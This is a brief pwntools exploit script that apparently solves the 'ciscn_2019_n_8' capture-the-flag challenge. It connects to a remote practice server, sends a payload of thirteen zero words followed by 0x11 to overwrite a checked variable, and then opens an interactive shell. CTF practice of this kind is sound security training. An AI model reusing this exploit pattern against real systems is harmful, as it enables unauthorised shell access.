from pwn import*
elf=ELF('./ciscn_2019_n_8')
#p=process('./ciscn_2019_n_8')
p=remote('node4.buuoj.cn',28717)
payload=p32(0)*13+p32(0x11)
p.sendline(payload)
p.interactive()